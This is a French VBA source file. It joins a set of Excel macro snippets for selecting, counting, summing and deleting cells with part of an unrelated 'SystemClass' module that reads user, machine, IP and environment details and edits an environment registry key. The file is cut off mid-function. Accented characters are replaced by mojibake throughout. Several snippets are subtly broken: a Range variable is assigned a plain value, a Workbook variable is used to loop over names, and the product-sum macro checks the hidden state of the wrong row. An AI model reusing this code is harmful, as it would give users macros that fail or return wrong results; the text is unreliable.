'Mettre en |fffd|vidence les cellules r|fffd|pondant |fffd| un crit|fffd|re.
'  Ce programme va s|fffd|lectionner toutes les cellules correspondant
'|fffd| la valeur contenue dans D2.
Sub SelectCellulesValeurDeterminee()
    Dim LaValeur As Range
    Dim cll As Range
    Dim Plg As String
LaValeur = Range("D2").Value
Range("A1").Select
For Each cll In ActiveCell.CurrentRegion
      If cll.Value = LaValeur Then Plg = Plg & cll.Address() & ","
Next cll
If VBA.Len(Plg) > 0 Then Range(VBA.Left(Plg, VBA.Len(Plg) - 1)).Select
End Sub
'Pour s|fffd|lectionner les lignes |fffd| la place des cellules :
'   Remplacer la ligne de code
'      If cll.Value = LaValeur Then Plg = Plg & cll.Address() & ","
'   par
'      If cll.Value = LaValeur Then Plg = Plg & cll.Row() & ":" & cll.Row() & ","

 
'Recherche du nombre d'occurence.
'  Ce programme va compter le nombre de fois qu'il rencontre la valeur ValeurAChercher
Sub RechercheNbOccurence()
    Dim R|fffd|sultat As Double
R|fffd|sultat = Application.CountIf(Range("A:A"), "ValeurAChercher")
MsgBox ("Le texte ValeurAChercher est pr|fffd|sent : " & R|fffd|sultat & " fois.")
End Sub

 
'Rechercher la derni|fffd|re cellule d'une plage.
'  Ce programme permet de positionner le curseur sur la derni|fffd|re cellule d'une plage
'correspondant |fffd| la cellule en cours.
Sub AllerADernierecellule()
'S|fffd|lectionne la plage en cours
ActiveSheet.UsedRange.Select
'S|fffd|lectionne la derni|fffd|re cellule de la plage en cours
ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Offset(0, 0).Select
End Sub


'Recopier une plage variable vers une autre feuille du classeur.
'  Ce programme permet de recopier une plage variable A8 |fffd| Gx vers une autre feuille (Feuil2) en A1.
'correspondant |fffd| la cellule en cours.
Sub SelectRecopie()
' Red|fffd|finir la plage en fonction du nombre de lignes
' S|fffd|lectionner cette plage
' Copier les valeurs contenues dans cette plage sur la feuille 2 |fffd| la cellule "A1"
With Worksheets(1)
.Range(.[A1], .[G1].End(xlDown)).Copy Worksheets(2).[A1]
End With
End Sub
 

'R|fffd|cup|fffd|rer la colonne active sous forme
'litt|fffd|rale (A, AB, AZ, etc...).
'  Ce programme permet de r|fffd|cup|fffd|rer la lettre de la colonne de la cellule active.
Sub LetCol()
Dim Let_Col As String
Let_Col = VBA.Left(VBA.Mid(ActiveCell.Address, 2), _
Len(VBA.Mid(ActiveCell.Address, 2)) - (Len(VBA.Mid(VBA.Mid(ActiveCell.Address, 2), _
Application.Search("$", VBA.Mid(ActiveCell.Address, 2), 1) + 1)) + 1))
MsgBox Let_Col
End Sub


'Autre variante avec utilisation des valeurs VRAI(-1) et FAUX (0)
Sub LettreColonne()
    Dim Lettre_Col As String
' Utilisation des valeurs VRAI (-1) et FAUX (0)
Lettre_Col = VBA.Left(ActiveCell.Address(0, 0), (ActiveCell.Column < 27) + 2)
MsgBox Lettre_Col
End Sub
 

'R|fffd|cup|fffd|rer la somme d'une colonne dans une variable.
'  Ce programme effectue la somme de la colonne A et la met dans une variable LaSomme.
Sub FaireSommeColonne()
Dim LaSomme As Double
LaSomme = Application.Sum(Range("A1").EntireColumn)
MsgBox LaSomme
End Sub
 

'R|fffd|cup|fffd|rer le nombre de colonnes.
'  1 - Nombre de colonnes comprises entre la premi|fffd|re cellule et la derni|fffd|re cellule
'de la plage s|fffd|lectionn|fffd|e (y compris |fffd|ventuellement les colonnes vides)
Sub NombreDeColonnes()
    Dim NbColonnes As Integer
NbColonnes = ActiveSheet.UsedRange.Columns.Count
MsgBox NbColonnes
End Sub


'2 - Nombre de colonnes comprises entre la colonne A (vide ou pas) et
'la derni|fffd|re cellule utilis|fffd|e (cette s|fffd|lection peut contenir des colonnes vides).
'Sub NombreDeColonnes()
'NbColonnes = Cells.SpecialCells(xlCellTypeLastCell).Column
'MsgBox NbColonnes
'End Sub

 
'R|fffd|cup|fffd|rer le nombre de lignes.
'  1 - Nombre de lignes comprises entre la premi|fffd|re cellule et la derni|fffd|re cellule
'de la plage s|fffd|lectionn|fffd|e (y compris |fffd|ventuellement les lignes vides)
Sub NombreDeLignes()
    Dim NbLignes As Long
NbLignes = ActiveSheet.UsedRange.Rows.Count
MsgBox NbLignes
End Sub


'2 - Nombre de lignes comprises entre la colonne A (vide ou pas) et
'la derni|fffd|re cellule utilis|fffd|e (cette s|fffd|lection peut contenir des lignes vides).
'Sub NombreDeLignes()
'NbLignes = Cells.SpecialCells(xlCellTypeLastCell).Row
'MsgBox NbLignes
'End Sub

 
'R|fffd|cup|fffd|rer la somme du produit de 2 colonnes.
'Somme des N valeurs (A1*B1 + A2*B2 ...)
'  Ce programme effectue le produit des valeurs de la colonne A par celles de
'la colonne B et additionne ces r|fffd|sultats.
Sub SommeProduit()
    Dim NbLignes As Long
    Dim Lgn As Long
    Dim TotalIntermediaire As Double
Cells(1, "A").Select
NbLignes = Cells(Range("A:A").Count, ActiveCell.Column).End(xlUp).row
NbLignes = Cells(16, 1).End(xlUp).row
TotalIntermediaire = 0
For Lgn = 2 To NbLignes 'Etiquettes en ligne 1
      If Not Rows(NbLignes).Hidden Then
            TotalIntermediaire = TotalIntermediaire + Cells(Lgn, "A") * Cells(Lgn, "B")
      End If
Next Lgn
MsgBox TotalIntermediaire
End Sub


'R|fffd|pertoire et nom de fichier dans pied de page.
'  Proc|fffd|dure |fffd| mettre dans This WorkBook
'La mise a jour ce fait d|fffd|s que l'on active un onglet.
Private Sub Workbook_SheetActivate(ByVal sh As Object)
      Dim ZtPath As String
      ZtPath = Application.ActiveWorkbook.path
      ActiveSheet.PageSetup.LeftFooter = ZtPath & "\" & "&F"
End Sub


'Supprimer les doublons dans une colonne.
'  Ce programme efface les doublons dans la colonne sans supprimer les lignes.
Sub EffaceDoublonsColonnnes()
Const Cell_D|fffd|part As String = "A1"
Dim Fin As Range, i As Long, j As Long, Col As Integer
Dim ModeCalcul As Long
With Application
      ModeCalcul = .Calculation
      .Calculation = xlCalculationManual
      .ScreenUpdating = False
End With
Col = Range(Cell_D|fffd|part).Column
Set Fin = Range(Cell_D|fffd|part).End(xlDown)(2)
On Error Resume Next
Do
      i = j + 1
      j = Range(Cells(i, 1), Fin).ColumnDifferences(Cells(i, 1))(0).row
      If j > i Then Range(Cells(i + 1, 1), Cells(j, 1)).ClearContents
Loop Until err
Application.Calculation = ModeCalcul
On Error GoTo 0
End Sub
 

'Supprimer les lignes vides d'une plage.
'  Ce programme supprime les lignes vides dans une plage.
Sub DetruireLigne()
Dim DerniereLigne As Long
Dim r As Long
DerniereLigne = ActiveSheet.UsedRange.Rows.Count
Application.ScreenUpdating = False
For r = DerniereLigne To 1 Step -1
      If Application.CountA(Rows(r)) = 0 Then Rows(r).Delete
Next r
End Sub
 

'Supprimer un nom dans une feuille de calcul.
'  Ce programme supprime le nom "Basevbnullstring dans toutes
'les feuilles du classeur.
Sub SupprimeUnNom()
Dim Nm As Workbook
For Each Nm In ActiveWorkbook.Names
If Nm.Name Like "Base" Then
      Nm.Delete
End If
Next Nm
End Sub
 

'Supprimer tous les noms dans une feuille de calcul.
'  Ce programme supprime tous les noms dans le classeur.
Sub SupprimeTouslesNoms()
Dim Nm As Workbook
For Each Nm In ActiveWorkbook.Names
      Nm.Delete
Next Nm
End Sub


'Supprimer les lignes contenant du texte
'  Ce programme recherche dans la colonne A les cellules contenant du texte et supprime
'les lignes associ|fffd|es |fffd| ces cellules.
Sub SupprimeLignesAvecTtexte()
Dim NbRw As Long
Dim Rw As Long
NbRw = Application.CountA(Columns("A:A"))
For Rw = NbRw To 1 Step -1
      If Application.IsText(Cells(Rw, 1)) Then Rows(Rw).Delete
Next Rw
End Sub
 


'Utilser des macro-commandes dans une
'feuille prot|fffd|g|fffd|e.
'  Ce programme permet d'utiliser des macro-commandes dans une feuille
'prot|fffd|g|fffd|e par Outils, Protection.
'Worksheets("Feuil1").Protect UserInterfaceOnly:=True permet de manipuler par macro une feuille prot|fffd|g|fffd|e, tout en laissant la protection active par rapport aux manipulations de l'utilisateur.

Private Sub Workbook_Open_X()
      Worksheets("Feuil1").Protect UserInterfaceOnly:=True
End Sub


'S|fffd|lection d 'une plage avec la souris.
'  Permet de s|fffd|lectionner une plage avec la souris (M|fffd|thode InputBox)
Sub SelectionPlageAvecSouris()
      Dim Plage As Range
      Set Plage = Application.InputBox("S|fffd|lectionnez une plage !", "S|fffd|lection de cellules", Type:=8)
      MsgBox ("La plage que vous avez s|fffd|l|fffd|ctionnez est : " & Plage.Address)
End Sub
 

'S|fffd|lection d 'une plage.
'  Permet de s|fffd|lectionner la zone en cours par rapport |fffd| la cellule active.
Sub SelectionPlage()
      ActiveCell.CurrentRegion.Select
      MsgBox ("La plage s|fffd|lectionn|fffd|e est : " & Selection.Address)
End Sub
 

'S|fffd|lection de 2 plages (non contig|fffd|es).
'  Permet de s|fffd|lectionner deux plages discontinues (Plage A1:Ax et C1:Cx)
'Sub SelectionDiscontinue()
'      Dim Z1, Z2, MaPlageMultiZone As Range
'      Worksheets("Feuil1").Select
'      Range("A1").Select
'      ActiveCell.End(xlDown).Select
'      Zone1 = ActiveCell.Address
'      Selection.Offset(0, 2).Select
'      Zone2 = ActiveCell.Address
'      Set Z1 = Range("A1", Zone1)
'      Set Z2 = Range("C1", Zone2)
'      Set MaPlageMultiZone = Union(Z1, Z2)
'      ZoneSelection = MaPlageMultiZone.Select
'End Sub
 
 
'S|fffd|lection de deux colonnes non contig|fffd|es.
'  Permet de s|fffd|lectionner deux colonnes A et D par exemple.
Sub SelectionDeuxColonnesNonContigues()
' Soit les colonnes A (1) et D (4) |fffd| s|fffd|lectionner
Dim NCol1 As Integer
Dim NCol2 As Integer

      NCol1 = 1
      NCol2 = 4
      Union(Cells(1, NCol1), Cells(1, NCol2)).EntireColumn.Select
End Sub


'S|fffd|lection de cellules caract|fffd|ristiques
'(par ex. cellules |fffd|gales |fffd| 20).
'  Permet de s|fffd|lectionner toutes les cellules dont la valeur est 20
Sub CellulesValeurDeterminee()
Dim LaValeur As String
Dim cll As Range
Dim Plg As String
' La valeur 20 est saisie en E2
      LaValeur = Range("E2").Value
      Range("A1").Select
      For Each cll In ActiveCell.CurrentRegion
            If cll.Value = LaValeur Then Plg = Plg & cll.Address() & ","
      Next cll
      If VBA.Len(Plg) > 0 Then Range(VBA.Left(Plg, VBA.Len(Plg) - 1)).Select
End Sub


'S|fffd|lection de cellules vers le bas depuis la cellule active.
  Sub SelectDown()
      Range(ActiveCell, ActiveCell.End(xlDown)).Select
End Sub


'S|fffd|lection de cellules vers le haut depuis la cellule active.
  Sub SelectUp()
Range(ActiveCell, ActiveCell.End(xlUp)).Select
End Sub


'S|fffd|lection de cellules vers la droite depuis la cellule active.
  Sub SelectLeft()
      Range(ActiveCell, ActiveCell.End(xlToLeft)).Select
End Sub


'S|fffd|lection de cellules vers la gauche depuis la cellule active.
  Sub SelectRight()
      Range(ActiveCell, ActiveCell.End(xlToRight)).Select
End Sub


'S|fffd|lection de cellules dans la plage courante depuis la cellule active.
  Sub SelectCurrentRegion()
      ActiveCell.CurrentRegion.Select
End Sub


'S|fffd|lection de cellules contigues dans la colonne de la cellule active.
  Sub SelectActiveColumn()
  Dim TopCell As Range
  Dim BottomCell As Range
      If IsEmpty(ActiveCell) Then Exit Sub
' Ignore error si Activecell est dans la ligne 1
      On Error Resume Next
      If IsEmpty(ActiveCell.Offset(-1, 0)) Then Set TopCell = ActiveCell Else Set TopCell = ActiveCell.End(xlUp)
      If IsEmpty(ActiveCell.Offset(1, 0)) Then Set BottomCell = ActiveCell Else Set BottomCell = ActiveCell.End(xlDown)
      Range(TopCell, BottomCell).Select
      On Error GoTo 0
End Sub


'S|fffd|lection de cellules contigues dans la ligne de la cellule active.
  Sub SelectActiveRow()
   Dim TopCell As Range
  Dim BottomCell As Range
      If IsEmpty(ActiveCell) Then Exit Sub
' Ignore error si Activecell est dans la colonne A
      On Error Resume Next
      If IsEmpty(ActiveCell.Offset(-1, 0)) Then Set TopCell = ActiveCell Else Set TopCell = ActiveCell.End(xlToLeft)
      If IsEmpty(ActiveCell.Offset(1, 0)) Then Set BottomCell = ActiveCell Else Set BottomCell = ActiveCell.End(xlToRight)
      Range(TopCell, BottomCell).Select
      On Error GoTo 0
End Sub


'S|fffd|lection d 'une colonne enti|fffd|re par rapport |fffd| la cellule active.
  Sub SelectEntireColumn()
      Selection.EntireColumn.Select
End Sub


'S|fffd|lection d 'une ligne enti|fffd|re par rapport |fffd| la cellule active.
  Sub SelectEntireRow()
      Selection.EntireRow.Select
End Sub


'Sub FindUsedRange()
'
'    Dim Rng1            As Range
'
'    Set Rng1 = RealUsedRange
'    If Rng1 Is Nothing Then
'        MsgBox "There is no used range, the worksheet is empty."
'    Else
'        MsgBox "The real used range is: " & Rng1.Address
'    End If
'
'End Sub
'
'Public Function RealUsedRange() As Range
'
'    Dim FirstRow        As Long
'    Dim LastRow         As Long
'    Dim FirstColumn     As Integer
'    Dim LastColumn      As Integer
'
'    On Error Resume Next
'
'    FirstRow = Cells.Find(What:="*", After:=Range("IV65536"), LookIn:=xlValues, LookAt:= _
'    xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext).Row
'
'    FirstColumn = Cells.Find(What:="*", After:=Range("IV65536"), LookIn:=xlValues, LookAt:= _
'    xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlNext).Column
'
'    LastRow = Cells.Find(What:="*", After:=Range("A1"), LookIn:=xlValues, LookAt:= _
'    xlPart, SearchOrder:=xlByRows, SearchDirection:=xlPrevious).Row
'
'    LastColumn = Cells.Find(What:="*", After:=Range("A1"), LookIn:=xlValues, LookAt:= _
'    xlPart, SearchOrder:=xlByColumns, SearchDirection:=xlPrevious).Column
'
'    Set RealUsedRange = Range(Cells(FirstRow, FirstColumn), Cells(LastRow, LastColumn))
'
'    On Error GoTo 0
'
'End Function
Attribute VB_Name = "SystemClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 27/03/2006
'[Version       : V1.4 du 01/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe Biblioth|fffd|que de fonctions Syst|fffd|me
'[---------------------------------------------------------------------------

Option Explicit

Private Type Hostent
    hName As Long
    hAliases As Long
    hAddrType As Integer
    hLength As Integer
    hAddrList As Long
End Type

Private Type WSAdata
    wVersion As Integer
    wHighVersion As Integer
    szDescription(0 To 256) As Byte
    szSystemStatus(0 To 128) As Byte
    iMaxSockets As Integer
    iMaxUpDg As Integer
    lpszVendorInfo As Long
End Type

Private Const VER_PLATFORM_WIN32s As Long = 0
Private Const VER_PLATFORM_WIN32_WINDOWS As Long = 1
Private Const VER_PLATFORM_WIN32_NT As Long = 2
Private Const VER_NT_SERVER As Long = &H3
Private Const VER_NT_WORKSTATION As Long = &H1
Private Const VER_SUITE_PERSONAL As Long = &H200
Private Const VER_SUITE_DATACENTER As Long = &H80
Private Const VER_SUITE_ENTERPRISE As Long = &H2

Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

Private Type OSVERSIONINFOEX
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type

Private Type QOCINFO
    dwSize As Long
    dwFlags As Long
    dwInSpeed As Long 'in bytes/second
    dwOutSpeed As Long 'in bytes/second
End Type

'------------------ Gestion des dossiers -------------
Private Type BROWSEINFO ' used by the function GetFolderName
    hOwner As Long
    pidlRoot As Long
    pszDisplayName As String
    lpszTitle As String
    ulFlags As Long
    lpfn As Long
    lParam As Long
    iImage As Long
End Type


Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFOEX) As Long

Private Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVersion&, lpWSAdata As WSAdata) As Long

Private Declare Function WSACleanup Lib "wsock32.dll" () As Long

Private Declare Function gethostname Lib "wsock32.dll" (ByVal HostName As String, ByVal HostLen As Integer) As Long

Private Declare Function GetHostByName Lib "wsock32.dll" Alias "gethostbyname" (ByVal HostName As String) As Long

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (dest As Any, ByVal Source As Long, ByVal cbCopy As Long)

Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private Declare Function IsNetworkAlive Lib "SENSAPI.DLL" (ByRef lpdwFlags As Long) As Long

Private Declare Function IsDestinationReachable Lib "SENSAPI.DLL" Alias "IsDestinationReachableA" (ByVal lpszDestination As String, ByRef lpQOCInfo As QOCINFO) As Long

Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" _
   (ByVal Agent As String, ByVal Access As Long, ByVal proxy As String, ByVal bypass As String, ByVal Flags As Long) As Long

Private Declare Function InternetConnect Lib "wininet" Alias "InternetConnectA" _
   (ByVal handle As Long, ByVal server As String, ByVal Port As Long, _
    ByVal user As String, ByVal Password As String, ByVal services As Long, _
    ByVal Flags As Long, ByVal context As Long) As Long

Private Declare Function InternetCloseHandle Lib "wininet" (ByVal handle As Long) As Long

Private Declare Function GetDiskFreeSpace Lib "KERNEL32.DLL" Alias "GetDiskFreeSpaceA" (ByVal lpRoot As String, _
    dwSectors As Long, dwBytes As Long, dwFreeClusters As Long, dwTotalClusters As Long) As Long

Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" _
    (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
    
Private Declare Function SHBrowseForFolder Lib "shell32.dll" Alias "SHBrowseForFolderA" (lpBrowseInfo As BROWSEINFO) As Long

Private Declare Sub CoTaskMemFree Lib "ole32" (ByVal pv As Long)

Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
                                            
Private Declare Function GetShortPathName Lib "KERNEL32.DLL" Alias "GetShortPathNameA" _
    (ByVal lpctstrLongName As String, ByVal lptstrShortName As String, ByVal buflen As Long) As Long
                                                            
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" _
    (ByVal lpBuffer As String, ByVal nSize As Long) As Long
                                                            
Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long

Private Declare Function GetEnvironmentVariable Lib "kernel32" Alias "GetEnvironmentVariableA" (ByVal lpName As String, ByVal lpBuffer As String, ByVal nSize As Long) As Long

Private Declare Function SetEnvironmentVariable Lib "kernel32" Alias "SetEnvironmentVariableA" (ByVal lpName As String, ByVal lpValue As String) As Long

Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" _
    (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, _
    ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long

Private Const WM_SETTINGCHANGE = &H1A
Private Const HWND_BROADCAST = &HFFFF&


'renvoie le s|fffd|parateur d|fffd|cimal du syst|fffd|me
Public Function SysSepDec() As String
    Dim Sep As String * 2
    
    GetLocaleInfo 0, &H16, Sep, 2
    SysSepDec = VBA.Left(Sep, 1)
End Function


'Recherche le S|fffd|parateur Decimal
Public Function Separateur_Decimal()
    Separateur_Decimal = Application.International(xlDecimalSeparator)
End Function


'Renvoi des infos sur l'environnement
Public Function Infos(Type_info As Integer) As String
    Select Case Type_info
        Case 1
            Infos = Application.OrganizationName
        Case 2
            Infos = Application.UserName
        Case 3
            Infos = Application.ActivePrinter
        Case 4
            Infos = Application.Creator
        Case 5
            Infos = Application.MemoryFree
        Case 6
            Infos = Application.OperatingSystem
        Case 7
            Infos = Application.Version
        Case 8
            Infos = Application.Build
    End Select
End Function


Public Function GetEnvVar(ByVal VarName As String) As String
  Dim sVar As String
  Dim lVar As Long
  
  lVar = 2048 '(le nombre max de charact|fffd|res |fffd| r|fffd|cup|fffd|rer)
  sVar = VBA.String(lVar, 0)
  lVar = GetEnvironmentVariable(VarName, sVar, lVar)
  GetEnvVar = VBA.Left(sVar, lVar)
End Function


'Public Function DonnerValeur(HK As HCle, Chemin As String, Valeur As String, Donnee As String)
'    RegCreateKey HKConvert(HK), Chemin, lng
'    RegSetValueEx lng, Valeur, 0&, 1, Donnee, vba.len(Donnee) + 1
'End Function


Public Function SetEnvVar(ByVal VarName As String, Value As String) As String
'    Dim lVar As Long
'    'Ne pas utiliser SetEnvironmentVariable : ne fait que changer la valeur de la ou des variable(s) d'environnement pour un 1 seul processus.
'    lVar = SetEnvironmentVariable(VarName, Value)

    Dim Tmp As String

    'Chaine du path
    Tmp = "SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;C:\ESSBASE6\BIN;C:\ESSBASE6\API\Redist;c:\sys\ora8i\bin;c:\sys\orawinnt\bin;C:\Sys\Pcom\;C:\Program Files\IBM\Trace Facility\;C:\PROGRA~1\CONTINUUS\CCM51\BIN;C:\ARBORPATH\bin"


    'Modifie la base de registre de windows (DonnerValeur est un fonction de modification de d'un cl|fffd| de registre que vous pouvez retrouver ici )
    RegCls.DonnerValeur 0, "SYSTEM\CurrentControlSet\Control\Session Manager\Environment", "ARBORPATH", Value
    'RegCls.DonnerValeur 0, "SYSTEM\CurrentControlSet\Control\Session Manager\Environment", "Path", Tmp

    'Message en Broadcoast pour l'envoie du changement |fffd| tous les processus de windows concernant cette modification
    SendMessage HWND_BROADCAST, WM_SETTINGCHANGE, 0, "Environment"

End Function


Sub Essai()
  Dim path As String
  path = GetEnvVar("userprofile") & "\Local Settings\Application Data\Microsoft\Outlook\Compteur.ini"
End Sub


'Renvoie l'identit|fffd| de l'utilisateur Courant
Function Get_User_Name() As String
    Dim lpBuff  As String * 25
    Dim ret     As Long
    
    ret = GetUserName(lpBuff, 25)
    Get_User_Name = VBA.Left(lpBuff, VBA.InStr(lpBuff, VBA.Chr(0)) - 1)
End Function

'Function OSUserName() As String
'    Dim buffer As String * 256
'    Dim BuffLen As Long
'    BuffLen = 256
'    If GetUserName(buffer, BuffLen) Then _
'    OSUserName = vba.left(buffer, BuffLen - 1)
'End Function


'Renvoie le Nom de la Machine Utilisateur
Function Get_Computer_Name() As String
    Dim Comp_Name As String * 255
    
    GetComputerName Comp_Name, VBA.Len(Comp_Name)
    'Recherche du caract|fffd|re vba.chr(0) terminal
    Get_Computer_Name = VBA.Left(Comp_Name, VBA.InStr(Comp_Name, VBA.Chr(0)) - 1)
End Function

'Private Function GetNomStation() As String
'    Try
'        Return Dns.GetHostName()
'    Catch ex As Exception
'        Return vbnullstring
'    End Try
'End Function

'Renvoie le chemin du r|fffd|pertoire temporaire
Function TempPathName() As String
  Dim sTempPath As String
  Dim iBufSize  As Integer
  Dim iRtn      As Long
  
  iBufSize = 256
  sTempPath = VBA.String$(iBufSize, VBA.Chr$(0))
  iRtn = GetTempPath(iBufSize, sTempPath)
  If iRtn > 0 Then
      sTempPath = VBA.Left(sTempPath, iRtn)
  Else
      sTempPath = vbNullString
  End If
  TempPathName = sTempPath
End Function


'Renvoie l'adresse IP de la Machine
Public Function Get_Computer_IP() As String
  Const SOCKET_ERROR = -1
  Dim WSAD      As WSAdata
  Dim Host      As Hostent
  Dim retVal    As Long
  Dim Nom       As String * 256
  Dim Adresse   As Long
  Dim IPadr     As String
  Dim Temp()    As Byte
  Dim i         As Integer

  retVal = WSAStartup(&H101, WSAD)
  If retVal <> 0 Then
    MsgCls.ShowMessage "MsgDefWinsock", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical
    Get_Computer_IP = vbNullString
    Exit Function
  End If
  
  If gethostname(Nom, VBA.Len(Nom)) = SOCKET_ERROR Then
    MsgCls.ShowMessage "MsgDefWinsock", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical
    Get_Computer_IP = vbNullString
    Exit Function
  End If
  
  Adresse = GetHostByName(Nom)
  If Adresse = 0 Then
    MsgCls.ShowMessage "MsgDefWinsock", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical
    Get_Computer_IP = vbNullString
    Exit Function
  End If
  
  CopyMemory Host, Adresse, Len(Host)
  CopyMemory Adresse, Host.hAddrList, 4
  
  ReDim Temp(1 To Host.hLength)
  
  CopyMemory Temp(1), Adresse, Host.hLength
  
  For i = 1 To Host.hLength
    IPadr = IPadr & Temp(i) & "."
  Next i
  
  IPadr = VBA.Trim(VBA.Left$(IPadr, VBA.Len(IPadr) - 1))
  Get_Computer_IP = IPadr
  retVal = WSACleanup()
End Function


'Private Function GetIP() As String
'    Dim strMachineName As String
'
'    'R|fffd|cup|fffd|re le nom de la machine
'    strMachineName = Dns.gethostname()
'
'    'R|fffd|cup|fffd|re le Host par le nom
'    Dim ipHost As IPHostEntry
'    ipHost = Dns.GetHostByName(strMachineName)
'
'    'On recup|fffd|re la liste des adresses IP de la machine dans un tableau
'    Dim ipAddr() As IPAddress = ipHost.AddressList
'    Dim count As Integer
'
'    'quelquesoit le nombre d'adresse IP on retourne la premi|fffd|re
'    Try
'        Return ipAddr(0).ToString
'    Catch ex As Exception
'        Return vbnullstring
'    End Try
'End Function


Function Connecte_Reseau_Renault() As Boolean
    Dim Result      As Long
    Dim QI          As QOCINFO
    Dim vTime       As Single
    Dim strDomain   As String
    
    Connecte_Reseau_Renault = False
    If IsNetworkAlive(Result) <> 0 Then
        IniCls.ReadStringIniMain "ARCA", "Domain", strDomain
        QI.dwSize = Len(QI)
        vTime = Timer
        
        Result = PingCls.Ping(strDomain) 'Augmenter le Timeout
        If Result < 0 Then
            'MsgBox "Ping failed, error: " & Result
        Else
            'MsgBox "Ping ok, R|fffd|sultat: " & Result
            Connecte_Reseau_Renault = True
        End If
        
'Modif du 01/08/2007
'        If IsDestinationReachable(strDomain, QI) <> 0 Then 'marche pas bien TimeOut ? Attente tr|fffd|s longue
'            Connecte_Reseau_Renault = True
'            'MsgBox Timer - vTime
'        Else
'            Result = PingCls.Ping(strDomain) 'Augmenter le Timeout
'            If Result < 0 Then
'                'MsgBox "Ping failed, error: " & Result
'            Else
'                'MsgBox "Ping ok, R|fffd|sultat: " & Result
'                Connecte_Reseau_Renault = True
'            End If
'        End If
    End If
End Function


'Affichage de la liste des variables d'environnement
Function VariablesEnvironnement()
    Dim i           As Integer
    Dim EnvString   As String
    i = 1
    Do
        EnvString = VBA.Environ(i)
        If EnvString = vbNullString Then Exit Do
        Debug.Print i, VBA.Environ(i)
        MsgBox i & " : " & VBA.Environ(i)
        i = i + 1
    Loop

'  Dim A As Integer
'
'  For A = 1 To 40
'    MsgBox VBA.Environ(A)
'  Next
End Function


'Renvoie la version du Syst|fffd|me
Function Get_System() As String
    Dim osvsn As String
    osvsn = Application.OperatingSystem
    If VBA.InStr(osvsn, "Windows (32-bit) NT 5") <> 0 Then
      Get_System = "Windows XP"
    ElseIf osvsn = "Windows (32-bit) 4.90" Then
      Get_System = "Windows Me"
    ElseIf osvsn = "Windows (32-bit) 4.10" Then
      Get_System = "Windows 98"
    ElseIf osvsn = "Windows (32-bit) 4.00" Then
      Get_System = "Windows 95"
    ElseIf osvsn = "Macintosh (PowerPC) 10.13" Then
      Get_System = "Mac OS X"
    ElseIf osvsn = "Macintosh (PowerPC) 9.00" Then
      Get_System = "Mac OS 9"
    Else
      Get_System = "Ind|fffd|termin|fffd|"
    End If
End Function


'Private Function GetOS() As String
'    Dim os As System.OperatingSystem = Environment.OSVersion
'
'    Select Case os.Platform
'        Case PlatformID.Win32NT
'            Select Case os.Version.Major
'                Case 4
'                    Return "Windows NT"
'                Case Else
'                    Return "Windows XP"
'            End Select
'        Case PlatformID.Win32Windows
'            Select Case os.Version.Minor
'                Case 1
'                    Return "Windows 98"
'                Case Else
'                    Return "Windows 95"
'            End Select
'        Case PlatformID.WinCE
'            Return "Windows CE"
'        Case PlatformID.Win32S
'            Return "Windows 3.1"
'    End Select
'End Function

'Private Function GetOSVersion() As String
'    Dim os As System.OperatingSystem = Environment.OSVersion
'    Return os.Version.ToString
'End Function


'Renvoie la version de Windows
Public Function GetWindowsVersion(Type_Station, Version_OS) As String
  Dim lRet      As Long
  Dim VerInfo1  As OSVERSIONINFOEX
  Dim VerInfo2  As OSVERSIONINFO

  On Error Resume Next

  VerInfo1.dwOSVersionInfoSize = Len(VerInfo1)

  lRet = GetVersionEx(VerInfo1)
  If lRet = 0 Then
    VerInfo1.dwOSVersionInfoSize = Len(VerInfo2)
    If GetVersionEx(VerInfo1) = 0 Then Exit Function
  End If

  With VerInfo1
    Select Case .dwPlatformId
      Case VER_PLATFORM_WIN32s
        GetWindowsVersion = "Win32s_pour_Windows_3.x"

      Case VER_PLATFORM_WIN32_WINDOWS
        Select Case .dwMinorVersion
          Case 0
            Select Case VBA.UCase(VBA.Trim(.szCSDVersion))
              Case "A"
